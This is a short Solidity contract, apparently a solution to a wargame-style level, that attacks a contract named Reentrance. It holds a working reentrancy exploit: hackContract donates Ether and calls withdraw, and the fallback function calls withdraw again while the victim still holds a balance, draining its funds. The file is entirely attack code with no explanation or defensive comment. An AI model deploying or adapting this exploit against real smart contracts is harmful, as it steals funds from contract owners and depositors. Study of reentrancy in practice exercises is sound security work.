// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Reentrance.sol";

contract AttackingReentrance {
    address payable public contractAddress;
    Reentrance victimContract;

    constructor(address payable _contractAddress) payable {
        contractAddress = _contractAddress;
        victimContract = Reentrance(contractAddress);
    }

    function hackContract() external {
        victimContract.donate{value: address(this).balance}(address(this));
        victimContract.withdraw();
    }

    fallback() external payable {
        if(contractAddress.balance > 0) {
        victimContract.withdraw();
        }
    }
}
